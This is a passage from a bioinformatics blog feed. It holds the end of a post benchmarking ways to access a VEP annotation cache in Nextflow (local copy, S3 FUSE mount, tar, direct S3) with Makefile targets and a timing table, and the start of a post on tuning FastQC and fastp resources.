<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">vep/114_GRCh38: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> vep</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> vep/vep_cache</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> vep </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core aws s3 --no-sign-request </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> s3://annotation-cache/vep_cache/114_GRCh38 114_GRCh38 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--recursive</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">vep/vep_cache.tar: vep/114_GRCh38</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-cvf</span><span class="token plain"> vep/vep_cache.tar </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> vep/114_GRCh38 </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">upload-vep-cache: vep/vep_cache.tar</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> vep/114_GRCh38 s3://io-benchmark/ --endpoint-url http://localhost:9000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--recursive</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> vep/vep_cache.tar s3://io-benchmark/ --endpoint-url http://localhost:9000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">mount-s3-vep-cache: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> ./mnt/vep_cache</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> ./mnt/tmp</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">mount</span><span class="token plain"> mount-s3 --endpoint-url http://localhost:9000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--region</span><span class="token plain"> us-east-1 --force-path-style io-benchmark ./mnt/vep_cache --read-only </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--cache</span><span class="token plain"> ./mnt/tmp --max-threads </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><br></span></code></pre></div></div>
<p>Simply run</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># download and upload to local s3</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> upload-vep-cach</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># mount to local folder from local s3 via mountpoint-s3 </span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> mount-s3-vep-cache</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="benchmark">Benchmark<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#benchmark" class="hash-link" aria-label="Direct link to Benchmark" title="Direct link to Benchmark" translate="no">​</a></h3>
<p>Here, I prepred the <code>Makefile</code> command to benchmark it quickly</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-vep-local: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core nextflow run benchmark_vep.nf </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--vep_cache</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"./vep/114_GRCh38"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-vep-mount-cache: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core nextflow run benchmark_vep.nf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_s3.config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_vep_mount.config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--vep_cache</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"./mnt/vep_cache/114_GRCh38"</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-vep-direct-s3: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core  nextflow run benchmark_vep.nf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_s3.config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--vep_cache</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"s3://io-benchmark/114_GRCh38"</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-vep-tar-cache: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core nextflow run benchmark_vep.nf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_s3.config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_vep_tar.config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--vep_cache</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"s3://io-benchmark/vep_cache"</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-vep-mount-tar: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> core nextflow run benchmark_vep.nf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_s3.config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_vep_mount_tar.config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--vep_cache</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"s3://io-benchmark/vep_cache"</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><br></span></code></pre></div></div>
<p>Now we can simply run the relative example test</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">test-vep-benchmarl</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><br></span></code></pre></div></div>
<p>The following table summarizes the benchmark results for different approaches to accessing the VEP cache database during analysis:</p>
<table><thead><tr><th>Method</th><th>Command</th><th style="text-align:center">Time (min<!-- -->:sec<!-- -->)</th></tr></thead><tbody><tr><td>Local cache</td><td><code>make test-vep-local</code></td><td style="text-align:center">2:26.20</td></tr><tr><td>S3 mount (FUSE)</td><td><code>make test-vep-mount-cache</code></td><td style="text-align:center">2:31.08</td></tr><tr><td>S3 mount tar (FUSE)</td><td><code>make test-vep-mount-tar</code></td><td style="text-align:center">5:57.18</td></tr><tr><td>Direct S3 access</td><td><code>make test-vep-direct-s3</code></td><td style="text-align:center">6:32.63</td></tr><tr><td>S3 tar cache</td><td><code>make test-vep-tar-cache</code></td><td style="text-align:center">6:02.52</td></tr></tbody></table>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li class="">As mentioned above, it does not need to download all of the database cache to annotate for the small vcf region files. That's why mounting the whole database is the best solution in this case</li>
<li class="">Replacing the VEP command with <code>cp \$(readlink $cache) tmp -r</code> in the module shows that it takes <code>4:16.09</code> to read from mount point and copy the whole folder to the new temporary folder.</li>
<li class="">Depended on your specific infrastructure, customize based on your need</li>
</ul></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="recap-2">Recap<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#recap-2" class="hash-link" aria-label="Direct link to Recap" title="Direct link to Recap" translate="no">​</a></h3>
<ul>
<li class="">Using tar files and untarring large inputs does not always guarantee significant performance improvements. The benefit depends on the number of files and the total size of your input folder.</li>
<li class="">If your tool only accesses a subset of the input files (rather than the entire folder), performance may be similar to having the database already available locally.</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="recap-3">Recap<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#recap-3" class="hash-link" aria-label="Direct link to Recap" title="Direct link to Recap" translate="no">​</a></h2>
<p>This comprehensive exploration of Nextflow's S3 integration revealed several key insights:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="performance-analysis">Performance Analysis<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#performance-analysis" class="hash-link" aria-label="Direct link to Performance Analysis" title="Direct link to Performance Analysis" translate="no">​</a></h3>
<ul>
<li class=""><strong>Small files vs Large files</strong>: Nextflow handles large single files efficiently but struggles with many small files due to per-file operations</li>
<li class=""><strong>Download methods</strong>: Tar files significantly outperform recursive downloads for small file collections (5x faster)</li>
<li class=""><strong>FUSE benefits</strong>: Mount points provide transparent access with better performance and does not require large disk size for local storage.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="optimization-strategies">Optimization Strategies<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#optimization-strategies" class="hash-link" aria-label="Direct link to Optimization Strategies" title="Direct link to Optimization Strategies" translate="no">​</a></h3>
<ul>
<li class=""><strong>Bundle small files</strong>: Use tar archives when dealing with numerous files (10k+ small files)</li>
<li class=""><strong>Stream processing</strong>: Pipe extraction for immediate processing without full download</li>
<li class=""><strong>Smart caching</strong>: Leverage FUSE-based caching for databases and reference data</li>
<li class=""><strong>Choose the right tool</strong>: Select download method based on file count and access patterns</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-applications">Practical Applications<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#practical-applications" class="hash-link" aria-label="Direct link to Practical Applications" title="Direct link to Practical Applications" translate="no">​</a></h3>
<ul>
<li class=""><strong>Genomics England case study</strong>: FUSE-based VEP annotation</li>
<li class=""><strong>Bioinformatics pipelines</strong>: The principles apply to any workflow using remote data storage</li>
<li class=""><strong>Cost considerations</strong>: Reduced download time + smaller disk size = lower compute costs on cloud platforms.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h3>
<ol>
<li class=""><strong>Profile before optimizing</strong>: Measure actual bottlenecks in your specific workflows</li>
<li class=""><strong>Consider file distribution</strong>: Many small ≠ few large when choosing download strategies</li>
<li class=""><strong>Use Nextflow v25.04+</strong>: Improved small file handling reduces need for workarounds</li>
<li class=""><strong>Leverage FUSE</strong>: Provides transparent access with better performance than CLI tools</li>
<li class=""><strong>Design for scale</strong>: Build workflows that work efficiently with your data characteristics</li>
</ol>
<p>Whether you're working with thousands of small files or terabytes of reference data, understanding these patterns helps you design more efficient, cost-effective bioinformatics workflows.</p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="nextflow" term="nextflow"/>
        <category label="hpc" term="hpc"/>
        <category label="workflow-optimization" term="workflow-optimization"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Bioinformatics Cost Optimization for Computing Resources Using Nextflow (Part 1)]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1</id>
        <link href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1"/>
        <updated>2026-01-18T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Many bioinformatics tools provide options to adjust the number of threads or CPU cores, which can reduce execution time with a modest increase in resource cost. But does doubling computational resources always result in processes running twice as fast? In practice, the speed-up is often less than linear, and each tool behaves differently.]]></summary>
        <content type="html"><![CDATA[<p>Many bioinformatics tools provide options to adjust the number of threads or CPU cores, which can reduce execution time with a modest increase in resource cost. But does doubling computational resources always result in processes running twice as fast? In practice, the speed-up is often less than linear, and each tool behaves differently.</p>
<p>In this post, I'll demonstrate how to optimize resource usage for individual tools, using a simple benchmarking workflow as a case study. The goal is to help you tune your workflow for efficient, production-ready execution.</p>
<p>With Nextflow—now one of the most widely used workflow managers—you gain powerful built-in features for tracing and reporting resource usage. By leveraging these capabilities, you can accurately measure CPU, memory, and run time for each step, helping you make informed optimization decisions to save both time and cost.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="getting-started-with-a-simple-workflow">Getting Started with a Simple Workflow<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#getting-started-with-a-simple-workflow" class="hash-link" aria-label="Direct link to Getting Started with a Simple Workflow" title="Direct link to Getting Started with a Simple Workflow" translate="no">​</a></h2>
<p>nf-core and Nextflow have become increasingly complex. Therefore, instead of jumping directly to nf-core/rnaseq, I'll use a simple workflow to demonstrate the concepts and what we need to know first. Later, we can apply the lessons learned from this workflow to improve more complex pipelines.</p>
<p>I created a simple workflow using two common tools that support thread/core options.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li class=""><strong>Tools</strong>: FastQC and fastp</li>
<li class=""><strong>Benchmarking approach</strong>: Run tools with increasing CPU and memory allocations (2x and 3x) to observe resource consumption and execution time</li>
<li class=""><strong>Repository</strong>: <a href="https://github.com/nttg8100/nextflow-cost-optimization" target="_blank" rel="noopener noreferrer" class="">https://github.com/nttg8100/nextflow-cost-optimization</a></li>
</ul></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-structure">Workflow Structure<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#workflow-structure" class="hash-link" aria-label="Direct link to Workflow Structure" title="Direct link to Workflow Structure" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── LICENSE</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── README.md</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── benchmark.nf    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Main workflow file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── inputs</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── 1_samplesheet.csv</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── full_samplesheet.csv</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── modules</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── fastp.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── fastqc.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── nextflow.config</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── pixi.lock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── pixi.toml</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-overview">Workflow Overview<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#workflow-overview" class="hash-link" aria-label="Direct link to Workflow Overview" title="Direct link to Workflow Overview" translate="no">​</a></h2>
<p>The following is a simple workflow with FastQC and fastp. It accepts a CSV file containing metadata and file paths for each sample, then performs FastQC and fastp independently.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class=""><strong>Aliasing strategy</strong>: Use aliases with prefix <code>_\&lt;number&gt;</code> (e.g., FASTQC_1, FASTQC_2) to configure increasing computing resources for benchmarking</li>
</ul></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> FASTQC as FASTQC_1 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/fastqc.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> FASTQC as FASTQC_2 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/fastqc.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 